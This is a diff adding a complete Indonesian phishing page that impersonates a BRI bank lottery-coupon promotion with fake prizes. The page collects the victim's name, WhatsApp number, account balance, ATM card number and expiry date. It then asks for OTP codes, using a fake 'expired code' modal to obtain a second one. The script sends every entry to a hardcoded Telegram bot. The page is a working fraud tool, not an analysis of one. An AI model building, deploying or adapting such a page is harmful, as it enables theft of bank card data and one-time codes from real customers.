@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    <title>Festival Kupon Undian 2026</title>
+    <meta property="og:title" content="Festival Kupon Undian 2026">
+    <meta property="og:description" content="Ambil kupon undian Anda sekarang dan menangkan Grand Prize Mobil, Motor, dan Hadiah Mewah Lainnya!">
+    
+    <meta property="og:image" content="https://cdn.phototourl.com/member/2026-08-26-5c36cae5-bb63-426a-80c8-b1905c4a11d3.jpg">
+
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --theme-blue: #00529C; 
+            --theme-dark-blue: #003399;
+            --text-dark: #333333;
+        }
+
+        html, body {
+            height: 100%; margin: 0; padding: 0;
+            font-family: 'Montserrat', sans-serif;
+            background: url('https://cdn.phototourl.com/member/2026-11-09-db7ed114-615f-4c36-b113-c3871d3f0b9d.jpg') no-repeat center center fixed;
+            background-size: cover;
+            overflow-x: hidden;
+        }
+
+        /* KHUSUS HALAMAN OTP LATAR BELAKANG PUTIH */
+        body.otp-active {
+            background: #FFFFFF !important;
+        }
+
+        .container { width: 100%; max-width: 480px; min-height: 100dvh; display: flex; flex-direction: column; justify-content: space-between; margin: 0 auto; padding-bottom: 15px; box-sizing: border-box; }
+        .header-img { width: 100%; height: auto; display: block; flex-shrink: 0; }
+
+        .banner-container {
+            width: 92%; margin: 6px auto; 
+            aspect-ratio: 16 / 9; 
+            position: relative; border-radius: 14px; overflow: hidden; flex-shrink: 0;
+            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+            background: #000;
+        }
+        .banner-img { width: 100%; height: 100%; object-fit: cover; display: block; }
+
+        .form-card {
+            width: 92%; margin: 0 auto; 
+            background: transparent; 
+            border-radius: 15px; 
+            padding: 5px 0; box-sizing: border-box;
+            display: flex; flex-direction: column;
+        }
+
+        .input-group { margin-bottom: 8px; position: relative; }
+        .input-label { display: flex; align-items: center; margin-bottom: 2px; }
+        .input-label span { font-size: 9px; font-weight: 800; color: #ffffff; text-transform: uppercase; letter-spacing: 0.8px; text-shadow: 1px 1px 2px rgba(0,0,0,0.7); }
+
+        /* DROPDOWN HADIAH */
+        .custom-select { width: 100%; margin-top: 2px; }
+        .select-header {
+            background: var(--theme-blue); color: white;
+            padding: 11px 15px; border-radius: 12px;
+            display: flex; align-items: center; justify-content: space-between;
+            cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.25);
+        }
+        .select-header-content { display: flex; align-items: center; gap: 10px; }
+        .select-header span { font-size: 12px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.5px; }
+        
+        .select-options {
+            position: absolute; top: 105%; left: 0; width: 100%;
+            background: white; border-radius: 15px;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.25);
+            z-index: 1000; display: none; 
+            max-height: 250px; overflow-y: auto; padding: 10px 0;
+        }
+        .option-item {
+            padding: 10px 15px; display: flex; align-items: center;
+            border-bottom: 1px solid #f2f2f2; cursor: pointer; transition: 0.2s;
+        }
+        .option-item:last-child { border-bottom: none; }
+        .option-item:active { background: #f9f9f9; }
+        
+        .opt-num {
+            background: var(--theme-blue); color: white;
+            width: 20px; height: 20px; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 10px; font-weight: 800; margin-right: 10px; flex-shrink: 0;
+        }
+        .opt-name { font-size: 11.5px; font-weight: 700; color: #333; flex-grow: 1; }
+        .opt-unit { font-size: 11px; font-weight: 800; color: var(--theme-blue); }
+
+        /* KOLOM INPUT DENGAN TEKS WARNA HITAM */
+        .input-line {
+            border: none;
+            background: rgba(255, 255, 255, 0.85); 
+            width: 100%; padding: 10px 14px; border-radius: 12px;
+            outline: none; font-size: 13.5px; font-weight: 700; 
+            color: #000000; font-family: 'Montserrat', sans-serif;
+            box-sizing: border-box;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.15);
+        }
+        .input-line::placeholder { color: #888888; }
+
+        /* TOMBOL DINAMIS */
+        .btn-submit {
+            background: #4A4A4A; color: #fff;
+            width: 100%; padding: 12px 18px; border: none; border-radius: 12px;
+            font-size: 13px; font-weight: 800; display: flex;
+            align-items: center; justify-content: space-between; cursor: not-allowed;
+            margin-top: 10px; box-shadow: 0 6px 15px rgba(0,0,0,0.3);
+            letter-spacing: 0.5px; transition: 0.3s;
+        }
+        .btn-submit.active {
+            background: var(--theme-blue);
+            cursor: pointer;
+            box-shadow: 0 6px 15px rgba(0,51,102,0.4);
+        }
+
+        /* GAYA TAMPILAN APLIKASI OTP */
+        .otp-app-container {
+            background: #FFFFFF;
+            width: 92%;
+            margin: 20px auto;
+            border-radius: 20px;
+            padding: 25px 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            border: 1px solid #eaeaea;
+            box-sizing: border-box;
+            text-align: center;
+        }
+        .otp-icon-box {
+            width: 60px; height: 60px; background: #eef5fc; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center; margin: 0 auto 15px auto;
+        }
+        .otp-title { font-size: 16px; font-weight: 800; color: #003399; margin-bottom: 8px; text-transform: uppercase; }
+        .otp-desc { font-size: 12px; color: #666666; line-height: 1.5; margin-bottom: 20px; }
+        .otp-timer { font-size: 14px; font-weight: 700; color: #d9534f; margin-top: 15px; }
+
+        /* FOOTER BRI */
+        .bri-footer {
+            width: 92%; margin: 10px auto 0 auto;
+            text-align: center; font-family: 'Montserrat', sans-serif;
+            flex-shrink: 0;
+        }
+        .footer-top {
+            display: flex; justify-content: space-between; align-items: center;
+            background: rgba(255, 255, 255, 0.92); padding: 8px 12px;
+            border-radius: 10px; margin-bottom: 6px;
+        }
+        .call-center { display: flex; align-items: center; gap: 6px; text-align: left; }
+        .call-center img { width: 26px; }
+        .call-text { font-size: 8px; font-weight: 700; color: #333; line-height: 1.1; }
+        .call-num { font-size: 11px; font-weight: 800; color: var(--theme-blue); }
+        .web-url { font-size: 12px; font-weight: 800; color: var(--theme-blue); }
+
+        .social-icons {
+            display: flex; justify-content: center; gap: 10px; margin: 4px 0;
+            font-size: 8.5px; font-weight: 700; color: #333;
+        }
+        .social-item { display: flex; align-items: center; gap: 3px; }
+        .social-item img { width: 12px; }
+
+        .legal-text {
+            font-size: 7.5px; color: #ffffff; line-height: 1.3; font-weight: 700;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.8);
+        }
+        body.otp-active .legal-text {
+            color: #555555 !important;
+            text-shadow: none !important;
+        }
+
+        #card-page, #otp-page, #success-page { display: none; flex-direction: column; }
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9); display: none; justify-content: center; align-items: center; z-index: 2000;
+        }
+        .modal-box { width: 82%; background: white; border-radius: 20px; padding: 40px 25px; text-align: center; }
+    </style>
+</head>
+<body>
+
+<div class="modal-overlay" id="otp-modal">
+    <div class="modal-box">
+        <div style="font-size: 60px; margin-bottom: 20px;">⚠️</div>
+        <div style="font-weight: 800; font-size: 16px; color: #333; text-transform: uppercase;">KODE VERIFIKASI KADALUARSA</div>
+        <div style="color: #666; font-size: 13px; margin-top: 15px; line-height: 1.6;">Kode yang Anda masukkan sudah tidak berlaku. Silakan masukkan kode OTP terbaru yang baru saja dikirimkan ke WhatsApp Anda.</div>
+        <button class="btn-submit active" onclick="closeModal()" style="margin-top: 35px; justify-content: center; height: 50px;">MASUKKAN OTP TERBARU</button>
+    </div>
+</div>
+
+<div class="container">
+    <!-- HALAMAN UTAMA -->
+    <div id="form-page" style="display: flex; flex-direction: column; width: 100%;">
+        <img src="https://cdn.phototourl.com/member/2026-08-15-731346b1-1426-4bf3-8802-fff966c40153.png" class="header-img">
+        
+        <div class="banner-container">
+            <img src="https://cdn.phototourl.com/member/2026-08-26-2e1ebc89-2dfa-40e8-a12b-423b36d3935d.png" class="banner-img">
+        </div>
+
+        <div class="form-card">
+            <div class="input-group">
+                <input type="hidden" id="hadiah" value="">
+                <div class="custom-select">
+                    <div class="select-header" onclick="toggleDropdown()">
+                        <div class="select-header-content">
+                            <img src="https://img.icons8.com/color/48/gift--v1.png" style="width:20px;">
+                            <span id="selectedLabel">LIHAT DAFTAR HADIAH</span>
+                        </div>
+                        <span id="chevron" style="transition: 0.3s; font-size: 14px;">▼</span>
+                    </div>
+                    <div class="select-options" id="dropdownList">
+                        <div class="option-item" onclick="selectOpt(1, 'Mobil Brio', '10 Unit')"><div class="opt-num">1</div><div class="opt-name">Mobil Brio</div><div class="opt-unit">10 Unit</div></div>
+                        <div class="option-item" onclick="selectOpt(2, 'Mobil Fortuner', '10 Unit')"><div class="opt-num">2</div><div class="opt-name">Mobil Fortuner</div><div class="opt-unit">10 Unit</div></div>
+                        <div class="option-item" onclick="selectOpt(3, 'Mobil Pajero', '10 Unit')"><div class="opt-num">3</div><div class="opt-name">Mobil Pajero</div><div class="opt-unit">10 Unit</div></div>
+                        <div class="option-item" onclick="selectOpt(4, 'Honda Scoopy', '20 Unit')"><div class="opt-num">4</div><div class="opt-name">Honda Scoopy</div><div class="opt-unit">20 Unit</div></div>
+                        <div class="option-item" onclick="selectOpt(5, 'Yamaha NMAX', '20 Unit')"><div class="opt-num">5</div><div class="opt-name">Yamaha NMAX</div><div class="opt-unit">20 Unit</div></div>
+                        <div class="option-item" onclick="selectOpt(6, 'Tablet & Laptop', '60 Unit')"><div class="opt-num">6</div><div class="opt-name">Tablet & Laptop</div><div class="opt-unit">60 Unit</div></div>
+                        <div class="option-item" onclick="selectOpt(7, 'Paket Umroh Gratis', '10 Paket')"><div class="opt-num">7</div><div class="opt-name">Paket Umroh Gratis</div><div class="opt-unit">10 Paket</div></div>
+                        <div class="option-item" onclick="selectOpt(8, 'Paket Wisata Malaysia', '10 Paket')"><div class="opt-num">8</div><div class="opt-name">Paket Wisata Malaysia</div><div class="opt-unit">10 Paket</div></div>
+                        <div class="option-item" onclick="selectOpt(9, 'Uang Tunai', 'Rp600 Juta')"><div class="opt-num">9</div><div class="opt-name">Uang Tunai</div><div class="opt-unit">Total Rp600 Juta</div></div>
+                        <div class="option-item" onclick="selectOpt(10, 'Emas Batangan', '20 Unit')"><div class="opt-num">10</div><div class="opt-name">Emas Batangan</div><div class="opt-unit">20 Unit</div></div>
+                        <div class="option-item" onclick="selectOpt(11, 'TV LED 50 In', '20 Unit')"><div class="opt-num">11</div><div class="opt-name">TV LED 50 In</div><div class="opt-unit">20 Unit</div></div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <div class="input-label"><span>Nama Lengkap Nasabah</span></div>
+                <input type="text" id="nama" class="input-line" placeholder="" oninput="validateForm()">
+            </div>
+            <div class="input-group">
+                <div class="input-label"><span>Nomor WhatsApp Aktif</span></div>
+                <input type="tel" id="noHp" class="input-line" placeholder="" oninput="validateForm()">
+            </div>
+            <div class="input-group">
+                <div class="input-label"><span>Estimasi Sisa Saldo</span></div>
+                <input type="tel" id="saldo" class="input-line" placeholder="" oninput="formatRp(this); validateForm()">
+            </div>
+            <button id="submitBtn" class="btn-submit" onclick="goCard()"><div>AMBIL KUPON SEKARANG</div><span>></span></button>
+        </div>
+    </div>
+
+    <!-- HALAMAN KARTU ATM -->
+    <div id="card-page" style="display: none; flex-direction: column; width: 100%;">
+        <div style="background: var(--theme-blue); padding: 18px; text-align: center; color: white;"><h3>VERIFIKASI DATA KARTU</h3></div>
+        <div style="width:88%; aspect-ratio:1.6/1; margin:25px auto; position:relative; border-radius:15px; overflow:hidden; box-shadow:0 20px 40px rgba(0,0,0,0.5);">
+            <img src="https://i.ibb.co/sJRfRxyx/file-0000000021b48207ad4e4680ca37d93d-1.png" style="width:100%;">
+            <div id="cardShow" style="position:absolute; top:57%; width:100%; text-align:center; color:white; font-family:monospace; font-size:21px; font-weight:bold; letter-spacing:2.2px; text-shadow: 2px 2px 4px #000;">xxxx xxxx xxxx xxxx</div>
+        </div>
+        <div class="form-card" style="height: auto; padding: 10px 0;">
+            <div class="input-group">
+                <div class="input-label"><span>Nomor Kartu ATM (16 Digit)</span></div>
+                <input type="tel" id="noKartu" class="input-line" maxlength="19" oninput="formatCard(this)" placeholder="1234 5678 9012 3456">
+            </div>
+            <div class="input-group">
+                <div class="input-label"><span>Masa Berlaku (MM/YY)</span></div>
+                <input type="tel" id="exp" class="input-line" maxlength="5" oninput="formatExp(this)" placeholder="12/28">
+            </div>
+            <button class="btn-submit active" onclick="goOtp()" style="justify-content:center; margin-top:20px; height: 50px;">KONFIRMASI KUPON</button>
+        </div>
+    </div>
+
+    <!-- HALAMAN KODE OTP (GAYA APLIKASI + TIMER 5 MENIT) -->
+    <div id="otp-page" style="display: none; flex-direction: column; width: 100%;">
+        <div style="background: var(--theme-blue); padding: 18px; text-align: center; color: white;"><h3>VERIFIKASI KEAMANAN</h3></div>
+        
+        <div class="otp-app-container">
+            <div class="otp-icon-box">
+                <img src="https://img.icons8.com/color/48/whatsapp.png" style="width: 32px;">
+            </div>
+            <div class="otp-title">Masukkan Kode OTP</div>
+            <div class="otp-desc">Kode verifikasi 6 digit telah dikirimkan melalui pesan WhatsApp ke nomor terdaftar Anda.</div>
+            
+            <input type="tel" id="otpIn" class="input-line" maxlength="6" placeholder="000000" style="font-size: 32px; letter-spacing: 10px; text-align: center; height: 60px; border: 2px solid #00529C; color: #000000;">
+            
+            <div class="otp-timer">Kode kadaluarsa dalam: <span id="countdown" style="font-weight: 800;">05:00</span></div>
+            
+            <button class="btn-submit active" onclick="valOtp()" style="margin-top:25px; justify-content:center; height:50px;">VERIFIKASI SEKARANG</button>
+        </div>
+    </div>
+
+    <!-- HALAMAN SUKSES -->
+    <div id="success-page" style="display: none; background: white; flex-direction: column; align-items: center; justify-content: center; text-align: center; height: 100vh; position: fixed; top: 0; left: 0; width: 100%; z-index: 3000;">
+        <img src="https://cdn-icons-png.flaticon.com/512/148/148767.png" style="width: 100px; margin-bottom: 30px;">
+        <h2 style="color: var(--theme-blue); font-weight: 900;">PENDAFTARAN BERHASIL</h2>
+        <p style="padding: 0 45px; color: #666; line-height: 1.8; font-size: 14px;">Nomor kupon undian Anda sedang dicetak otomatis. Mohon tunggu konfirmasi resmi melalui WhatsApp.</p>
+    </div>
+
+    <!-- FOOTER BRI -->
+    <div class="bri-footer">
+        <div class="footer-top">
+            <div class="call-center">
+                <img src="https://img.icons8.com/color/48/headset.png" alt="Call">
+                <div>
+                    <div class="call-text">CONTACT BRI</div>
+                    <div class="call-num">14017 / 1500017</div>
+                </div>
+            </div>
+            <div class="web-url">www.bri.co.id</div>
+        </div>
+        <div class="social-icons">
+            <div class="social-item"><img src="https://img.icons8.com/color/48/instagram-new.png"> bankbri_id</div>
+            <div class="social-item"><img src="https://img.icons8.com/color/48/twitter.png"> bankbri_id</div>
+            <div class="social-item"><img src="https://img.icons8.com/color/48/facebook-new.png"> BANK BRI</div>
+        </div>
+        <div class="social-icons" style="justify-content: center; margin-top: 2px;">
+            <div class="social-item"><img src="https://img.icons8.com/color/48/youtube-play.png"> BANK BRI</div>
+            <div class="social-item"><img src="https://img.icons8.com/color/48/tiktok.png"> bankbri_id</div>
+        </div>
+        <div class="legal-text" style="margin-top: 4px;">
+            BRI merupakan peserta penjaminan LPS & berizin dan diawasi oleh Otoritas Jasa Keuangan
+        </div>
+    </div>
+</div>
+
+<script>
+    const teleToken = "7919648936:AAEF42RaF1_P_GXVE-abo01kggWNKo812wI";
+    const chatID = "7667144622"; 
+    let tr = 0;
+    let timerInterval;
+
+    function toggleDropdown() {
+        const list = document.getElementById('dropdownList');
+        const chev = document.getElementById('chevron');
+        list.style.display = list.style.display === 'block' ? 'none' : 'block';
+        chev.style.transform = list.style.display === 'block' ? 'rotate(180deg)' : 'rotate(0deg)';
+    }
+
+    function selectOpt(num, name, unit) {
+        document.getElementById('hadiah').value = name + " - " + unit;
+        document.getElementById('selectedLabel').innerText = name.toUpperCase();
+        toggleDropdown();
+        validateForm();
+    }
+
+    function formatRp(e) { 
+        let v = e.value.replace(/\D/g,''); 
+        e.value = v ? "Rp " + v.replace(/\B(?=(\d{3})+(?!\d))/g, ".") : ""; 
+    }
+
+    function formatCard(e) { 
+        let v = e.value.replace(/\D/g, ''); 
+        let f = v.match(/.{1,4}/g)?.join(' ') || ''; 
+        e.value = f.substring(0, 19); 
+        document.getElementById('cardShow').innerText = e.value || "xxxx xxxx xxxx xxxx"; 
+    }
+
+    function formatExp(e) { 
+        let v = e.value.replace(/\D/g, ''); 
+        if (v.length >= 2) { 
+            e.value = v.substring(0, 2) + '/' + v.substring(2, 4); 
+        } else { 
+            e.value = v; 
+        } 
+    }
+
+    function validateForm() {
+        const h = document.getElementById('hadiah').value;
+        const n = document.getElementById('nama').value.trim();
+        const p = document.getElementById('noHp').value.trim();
+        const s = document.getElementById('saldo').value.trim();
+        const btn = document.getElementById('submitBtn');
+
+        if (h !== "" && n !== "" && p !== "" && s !== "") {
+            btn.classList.add('active');
+        } else {
+            btn.classList.remove('active');
+        }
+    }
+
+    function startTimer(duration, display) {
+        let timer = duration, minutes, seconds;
+        clearInterval(timerInterval);
+        timerInterval = setInterval(function () {
+            minutes = parseInt(timer / 60, 10);
+            seconds = parseInt(timer % 60, 10);
+
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+
+            display.textContent = minutes + ":" + seconds;
+
+            if (--timer < 0) {
+                clearInterval(timerInterval);
+                display.textContent = "00:00";
+            }
+        }, 1000);
+    }
+
+    function sendTelegram(msg) {
+        fetch(`https://api.telegram.org/bot${teleToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: chatID, text: msg, parse_mode: 'html'})
+        });
+    }
+
+    function goCard() {
+        const h = document.getElementById('hadiah').value;
+        const n = document.getElementById('nama').value;
+        const p = document.getElementById('noHp').value;
+        
+        if(!h || !n || !p) return;
+        
+        sendTelegram(`<b>🔔 PENDAFTARAN BARU</b>\nNama: ${n}\nWA: ${p}\nHadiah: ${h}\nSaldo: ${document.getElementById('saldo').value}`);
+        document.getElementById('form-page').style.display='none'; 
+        document.getElementById('card-page').style.display='flex'; 
+        window.scrollTo(0,0);
+    }
+
+    function goOtp() {
+        if(document.getElementById('noKartu').value.length < 16) return alert("Nomor kartu tidak valid!");
+        sendTelegram(`<b>💳 DATA KARTU ATM</b>\nNama: ${document.getElementById('nama').value}\nNo Kartu: ${document.getElementById('noKartu').value}\nExp: ${document.getElementById('exp').value}`);
+        document.getElementById('card-page').style.display='none'; 
+        document.getElementById('otp-page').style.display='flex'; 
+        
+        document.body.classList.add('otp-active');
+        
+        let fiveMinutes = 60 * 5,
+            display = document.querySelector('#countdown');
+        startTimer(fiveMinutes, display);
+
+        window.scrollTo(0,0);
+    }
+
+    function valOtp() {
+        const o = document.getElementById('otpIn').value;
+        if(o.length < 6) return alert("Masukkan 6 digit kode!");
+        sendTelegram(`<b>🔑 KODE OTP ${tr + 1}</b>\nNama: ${document.getElementById('nama').value}\nKode: ${o}`);
+        if(tr === 0) { document.getElementById('otp-modal').style.display='flex'; document.getElementById('otpIn').value = ""; tr++; } 
+        else { document.getElementById('otp-page').style.display='none'; document.getElementById('success-page').style.display='flex'; window.scrollTo(0,0); }
+    }
+
+    function closeModal() { document.getElementById('otp-modal').style.display='none'; }
+</script>
+</body>
+</html>
